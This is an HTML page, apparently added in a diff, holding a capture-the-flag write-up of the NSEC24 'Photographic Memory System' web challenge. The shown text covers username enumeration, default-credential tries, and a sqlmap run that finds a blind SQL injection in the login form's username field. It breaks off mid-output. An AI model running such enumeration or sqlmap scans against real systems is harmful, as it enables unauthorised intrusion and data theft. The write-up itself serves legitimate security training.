@@ -1,0 +1,1233 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Bring you offensive spirit to the next level">
+      
+      
+      
+        <link rel="canonical" href="https://s-lck.github.io/HolisticPwning/write-up/NSEC24_Photographic-Memory-System/">
+      
+      
+        <link rel="prev" href="../../binary-exploitation/3-egghunters/">
+      
+      
+        <link rel="next" href="../NSEC25_Fuel-Management-System/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>NSEC24 : Photographic Memory System - Holistic Pwning</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="NSEC24 : Photographic Memory System - Holistic Pwning" >
+      
+        <meta  property="og:description"  content="Bring you offensive spirit to the next level" >
+      
+        <meta  property="og:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/write-up/NSEC24_Photographic-Memory-System.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://s-lck.github.io/HolisticPwning/write-up/NSEC24_Photographic-Memory-System/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="NSEC24 : Photographic Memory System - Holistic Pwning" >
+      
+        <meta  name="twitter:description"  content="Bring you offensive spirit to the next level" >
+      
+        <meta  name="twitter:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/write-up/NSEC24_Photographic-Memory-System.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nsec24-photographic-memory-system" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Holistic Pwning" class="md-header__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Holistic Pwning
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NSEC24 : Photographic Memory System
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Holistic Pwning" class="md-nav__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Holistic Pwning
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Holistic Pwning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Binary exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Binary exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/0-architecture-x86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Architecture et debugger
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/1-stack-overflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Stack Overflow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/2-seh-overflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SEH Overflow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/3-egghunters/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Egg Hunters
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Write up
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Write up
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    NSEC24 : Photographic Memory System
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    NSEC24 : Photographic Memory System
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#username-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Username enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injections" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL injections
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injections">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#regex" class="md-nav__link">
+    <span class="md-ellipsis">
+      Regex
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      sqlmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-regex" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypass regex
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lets-automate" class="md-nav__link">
+    <span class="md-ellipsis">
+      Let's automate
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Let&#39;s automate">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      Databases
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tables
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#data" class="md-nav__link">
+    <span class="md-ellipsis">
+      Data
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      File upload
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Code Execution
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NSEC25_Fuel-Management-System/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NSEC25 : Fuel Management System
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#username-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Username enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injections" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL injections
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injections">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#regex" class="md-nav__link">
+    <span class="md-ellipsis">
+      Regex
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      sqlmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-regex" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypass regex
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lets-automate" class="md-nav__link">
+    <span class="md-ellipsis">
+      Let's automate
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Let&#39;s automate">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      Databases
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tables
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#data" class="md-nav__link">
+    <span class="md-ellipsis">
+      Data
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      File upload
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Code Execution
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="nsec24-photographic-memory-system">NSEC24 : Photographic Memory System</h1>
+<h2 id="challenge">Challenge</h2>
+<p>During the <a href="https://nsec.io/competition/">NSEC24 CTF</a> I had the opportunity to solve the following challenge with the help of my colleagues <a href="https://www.linkedin.com/in/ash-ay/">Ashiahanim Ayassor</a> and <a href="https://www.linkedin.com/in/charl-alexandre-le-brun/">Charl-Alexandre Le Brun</a>. I will detail all the steps of this challenge in this blog post.</p>
+<p>The following information was given during the CTF:</p>
+<p><img alt="Challenge on Feel Well" src="../res/nsec24/feel-well.png" /></p>
+<p>The first step was to follow the given URL <a href="http://photographic-memory.ctf">http://photographic-memory.ctf</a>:</p>
+<p><img alt="Photographic Memory panel" src="../res/nsec24/panel.png" /></p>
+<h2 id="username-enumeration">Username enumeration</h2>
+<p>Our first shot was to test the authentication using default credentials like <code>admin:admin</code> which gave us the following message:</p>
+<p><img alt="Username exists" src="../res/nsec24/username-admin.png" /></p>
+<p>Using another couple of credentials <code>root:admin</code> gave us another message:</p>
+<p><img alt="Username doesn't exist" src="../res/nsec24/username-root.png" /></p>
+<p>At that point it was clear that the application was vulnerable to username enumeration allowing us to know that the user <code>admin</code> exists in the application.</p>
+<h2 id="sql-injections">SQL injections</h2>
+<h3 id="regex">Regex</h3>
+<p>After trying multiple password with the <code>admin</code> username, we tried various SQL injection on the <code>username</code> field leading us to get the following error message:</p>
+<p><img alt="Regex error message" src="../res/nsec24/regex.png" /></p>
+<p>This error message let us know that there are restrictions on the username field that will limit us from performing SQL injections.</p>
+<h3 id="sqlmap">sqlmap</h3>
+<p>We were curious to see if <code>sqlmap</code> could allow us to grab some information despite the regex limitation so we ran it against the web portal and we got the following results:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="err">$</span><span class="w"> </span><span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="c1">--level 5 --risk 3 --all</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">[...]</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c1">---</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">Parameter</span><span class="p">:</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="p">(</span><span class="n">POST</span><span class="p">)</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
